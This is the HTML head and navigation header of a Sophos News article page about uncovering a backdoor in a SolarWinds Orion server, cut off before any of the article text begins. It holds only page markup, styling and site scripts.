<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
	<link rel="alternate" hreflang="es-419" href="https://news.sophos.com/es-419/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="nl-nl" href="https://news.sophos.com/nl-nl/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="pt-br" href="https://news.sophos.com/pt-br/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="de-de" href="https://news.sophos.com/de-de/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="fr-fr" href="https://news.sophos.com/fr-fr/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="es-es" href="https://news.sophos.com/es-es/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="it-it" href="https://news.sophos.com/it-it/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="ja-jp" href="https://news.sophos.com/ja-jp/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
	<link rel="alternate" hreflang="zh-tw" href="https://news.sophos.com/zh-tw/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server" />
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server Comments Feed" href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/feed/" />
<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.0.1"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??-eJyNj9EOwjAIRX/IDpeomQ/Gb+komSjtmsJi+vfOmSXbm48XOMCBd3acUKZACqgKgdWglxFfTrgvvlRQq0JN5NTMAwfYEk+FSIE9CUVKtgtZfKXihAaP9T987m3zDsIx2XJiclmmgZOCki/4ABKvxpgLrf9/RcpcNgouj2rqfkaLia5r7/HWXs5ddzq21+4DN6hjBg==' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<style id='global-styles-inline-css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='all-css-2' href='https://news.sophos.com/_static/??/wp-content/themes/sophosnews-2017/style-2021.css,/wp-content/mu-plugins/jetpack-11.1/css/jetpack.css?m=1658840194' type='text/css' media='all' />
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZqYWFkTmQyAIAr9AiMg==" ></script><link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/72266" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 6.0.1" />
<link rel="canonical" href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" />
<link rel='shortlink' href='https://news.sophos.com/?p=72266' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2021%2F02%2F03%2Fmtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2021%2F02%2F03%2Fmtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server%2F&#038;format=xml" />
<style>img#wpstats{display:none}</style>
	<link rel="amphtml" href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server" />
<meta property="og:url" content="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" />
<meta property="og:description" content="A real-world story from the Sophos Managed Threat Response team" />
<meta property="article:published_time" content="2021-02-03T17:07:13+00:00" />
<meta property="article:modified_time" content="2021-05-21T16:12:35+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="335" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta property="fb:admins" content="28552295016" />
<meta name="twitter:text:title" content="MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-72266 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="sr-only" href="#content">Skip to content</a>

	
<header class="bg-blue-600" x-data="{ mobileMenu: false, searchField: false }">
	<div class="container">
		<div class="flex items-center justify-between h-16">

			<!-- Logo -->
			<div class="flex-shrink-0">
				<a class="site-logo" href="https://news.sophos.com/en-us/" rel="home">
				<svg width="172" height="17" xmlns="http://www.w3.org/2000/svg">
					<g fill="#FFF" fill-rule="evenodd">
						<path d="M113.024 5.298V16.74h-2.595V.259h2.265l7.997 11.49V.26h2.619v16.482h-2.289l-7.997-11.443M126.064.259h10.78v2.307H128.8v4.521h7.549v2.214h-7.55v5.133h8.376v2.307h-11.111V.259M138.478.259h2.855l2.694 12.29L147.29.26h2.783l3.61 12.314L156.005.26h2.783l-3.62 16.482h-2.76l-3.751-12.126-3.426 12.126h-2.784L138.478.259M168.933 4.968v-.283c0-1.318-.778-2.425-3.492-2.425-2.43 0-3.279 1.013-3.279 2.284 0 1.201.708 1.743 2.218 2.073l3.491.776c2.123.448 4.129 1.602 4.129 4.333 0 3.014-1.675 5.274-6.204 5.274-5.214 0-6.559-2.26-6.559-4.52v-.307h2.737v.26c0 1.2.755 2.284 3.774 2.284 2.5 0 3.421-1.084 3.421-2.638 0-1.224-.731-1.907-2.289-2.237l-3.49-.777c-2.407-.517-3.917-1.742-3.917-4.309 0-2.566 1.77-4.756 6.016-4.756 4.553 0 6.18 2.26 6.18 4.639v.33h-2.736M85.303 16.718h8.88c2.492 0 3.549-.15 4.379-.677 1.308-.803 2.139-2.378 2.139-4.162 0-1.457-.504-2.868-1.258-3.622-.981-1.006-2.316-1.382-4.783-1.382h-2.693c-1.208 0-2.097-.05-2.6-.276-.605-.277-.956-.81-.956-1.562 0-.88.427-1.455 1.132-1.632.529-.124 1.14-.124 2.726-.15h7.949V.265h-8.754c-1.963 0-2.843.075-3.598.353-1.737.602-2.921 2.383-2.921 4.518 0 1.458.58 2.745 1.587 3.624.881.753 2.189 1.105 4.202 1.105h3.584c.805 0 1.46.1 1.813.3.678.327 1.08.934 1.08 1.714 0 .652-.301 1.122-.83 1.447-.426.278-1.158.403-2.49.403h-8.588v2.99zm-84.945 0h8.88c2.492 0 3.549-.15 4.38-.677 1.307-.803 2.138-2.378 2.138-4.162 0-1.457-.504-2.868-1.258-3.622-.982-1.006-2.316-1.382-4.783-1.382H7.023c-1.209 0-2.098-.05-2.6-.276-.605-.277-.957-.81-.957-1.562 0-.88.427-1.455 1.132-1.632.53-.124 1.141-.124 2.726-.15h7.95V.265H6.52c-1.964 0-2.844.075-3.6.353C1.185 1.22 0 3 0 5.136 0 6.594.582 7.881 1.587 8.76c.881.753 2.19 1.105 4.203 1.105h3.582c.807 0 1.46.1 1.814.3.678.327 1.08.934 1.08 1.714 0 .652-.3 1.122-.83 1.447-.426.278-1.157.403-2.49.403H.358v2.99zM71.99 4.596c-.52.813-.765 2.118-.765 3.87 0 3.845 1.331 5.595 4.294 5.595 2.915 0 4.248-1.75 4.248-5.546 0-3.847-1.308-5.571-4.248-5.571-1.604 0-2.864.592-3.53 1.652zm10.05-1.897c1.013 1.33 1.58 3.498 1.58 6.039 0 2.882-.914 5.249-2.544 6.555-1.233.986-3.11 1.528-5.335 1.528-3.16 0-5.654-1.037-6.937-2.884-.964-1.355-1.435-3.155-1.435-5.35 0-3.152.866-5.544 2.495-6.826C71.149.726 73.175.158 75.497.158c2.938 0 5.284.913 6.543 2.54zM65.36.279h-3.507v6.73h-6.345V.278h-3.507v16.439h3.507V9.94h6.345v6.778h3.506V.278zM43.533 8.042c.938 0 1.48-.123 1.852-.469.442-.37.715-1.158.715-2.07 0-1.084-.443-1.872-1.208-2.144-.272-.1-.717-.149-1.286-.149h-4.839v4.832h4.766zm-4.766 8.674h-3.507V.278h8.223c2.889 0 3.902.295 4.988 1.504.964 1.036 1.481 2.39 1.481 3.845 0 1.725-.69 3.327-1.826 4.289-.962.813-1.854 1.058-3.728 1.058h-5.63v5.743zM21.665 4.596c-.519.813-.764 2.118-.764 3.87 0 3.845 1.333 5.595 4.297 5.595 2.913 0 4.247-1.75 4.247-5.546 0-3.847-1.308-5.571-4.247-5.571-1.606 0-2.866.592-3.533 1.652zm10.052-1.897c1.014 1.33 1.581 3.498 1.581 6.039 0 2.882-.914 5.249-2.545 6.555-1.233.986-3.11 1.528-5.333 1.528-3.162 0-5.656-1.037-6.94-2.884-.964-1.355-1.432-3.155-1.432-5.35 0-3.152.865-5.544 2.496-6.826C20.825.726 22.85.158 25.173.158c2.938 0 5.286.913 6.544 2.54z"/>
					</g>
				</svg>
				</a>
			</div>

			<!-- Search Field -->
			<div class="lg:flex justify-end flex-grow hidden" x-show="searchField" x-cloak>
				<div class="relative w-1/2 rounded-md shadow-sm">
					<form role="search" method="get" action="https://news.sophos.com/en-us/">
						<input
							type="text"
							class="block w-full text-lg text-white placeholder-gray-100 bg-blue-800 border-0 rounded-md font-sansMedium font-medium"
							placeholder="Type to Search News"
							x-ref="searchInput"
							name="s"
						/>
						<div class="absolute inset-y-0 right-0 flex items-center px-3">
							<button
								class="hover:opacity-100 opacity-60 p-1 text-xs text-white uppercase rounded-full cursor-pointer"
								type="submit"
							>
								Search							</button>
						</div>
					</form>
				</div>
			</div>

			<!-- Main Nav -->
			<div class="lg:flex items-center flex-grow hidden" x-show="!searchField" x-cloak>
				<div class="flex ml-auto">
				<ul id="menu-en-us-primary" class="primary-menu"><li id="menu-item-77773" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li id="menu-item-77772" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li id="menu-item-77774" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-85326" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-77776" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-77776"><a href="https://nakedsecurity.sophos.com">Security News<div class="menu-item-description"></div></a></li>
<li id="menu-item-83702" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>				</div>
			</div>

			<!-- Search button -->
			<div class="lg:block hidden ml-4">
				<div class="flex items-center">
					<button
					class="border-2 border-transparent hover:border-white inline-flex items-center justify-center p-2 text-white rounded-md focus:outline-none transition-colors"
					@click.prevent="searchField = !searchField; $nextTick(() => { setTimeout(() => { $refs.searchInput.focus(); }, 150);});"
					>
						<span class="sr-only">Search</span>
						<!-- Heroicon name: outline/bell -->
						<svg
							class="w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							:class="{ 'block': !searchField, 'hidden': searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
							/>
						</svg>
						<svg
							class="hidden w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							aria-hidden="true"
							:class="{ 'block': searchField, 'hidden': !searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M6 18L18 6M6 6l12 12"
							/>
						</svg>
					</button>
				</div>
			</div>

			<!-- Mobile menu button -->
			<div class="lg:hidden flex -mr-2">
				<button
					type="button"
					class="hover:text-white hover:bg-blue-800 focus:outline-none hover:ring-2 focus:ring-offset-2 focus:ring-offset-gray-300 focus:ring-white inline-flex items-center justify-center p-2 text-white rounded-md"
					aria-controls="mobile-menu"
					aria-expanded="false"
					@click="mobileMenu = !mobileMenu"
				>
					<span class="sr-only">Open main menu</span>
					<!--
						Heroicon name: outline/menu

						Menu open: "hidden", Menu closed: "block"
					-->
					<svg
					class="block w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					:class="{ 'block': !mobileMenu, 'hidden': mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M4 6h16M4 12h16m-7 6h7"
					/>
					</svg>
					<!--
						Heroicon name: outline/x

						Menu open: "block", Menu closed: "hidden"
					-->
					<svg
					class="hidden w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					aria-hidden="true"
					:class="{ 'block': mobileMenu, 'hidden': !mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M6 18L18 6M6 6l12 12"
					/>
					</svg>
				</button>
			</div>
		</div>
	</div>

	<!-- Mobile menu, show/hide based on menu state. -->
	<div
	class="lg:hidden container"
	x-show="mobileMenu"
	x-cloak
	x-transition:enter="transition-all ease-out duration-100"
	x-transition:enter-start="transform opacity-0 scale-95"
	x-transition:enter-end="transform opacity-100 scale-100"
	x-transition:leave="transition ease-in duration-75"
	x-transition:leave-start="transform opacity-100 scale-100"
	x-transition:leave-end="transform opacity-0 scale-95"
	>
		<div class="pt-2 pb-8 space-y-2">
			<div class="relative rounded-md shadow-sm">
				<form role="search" method="get" action="https://news.sophos.com/en-us/">
					<input
						type="text"
						class="focus:ring-blue-600 focus:border-blue-600 sm:text-sm block w-full placeholder-gray-600 border-gray-300 rounded-md"
						placeholder="Search News"
						name="s"
					/>
					<div
						class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none"
					>
						<button class="p-1 text-gray-500 rounded-full" type="submit">
							<span class="sr-only">Search</span>
							<!-- Heroicon name: outline/bell -->
							<svg
								class="w-4 h-4"
								xmlns="http://www.w3.org/2000/svg"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor"
							>
								<path
									stroke-linecap="round"
									stroke-linejoin="round"
									stroke-width="3"
									d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
								/>
							</svg>
						</button>
					</div>
				</form>
			</div>

			<ul id="menu-en-us-primary-1" class="mobile-menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-77776"><a href="https://nakedsecurity.sophos.com">Security News<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>		</div>
	</div>
</header>

	<div id="content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
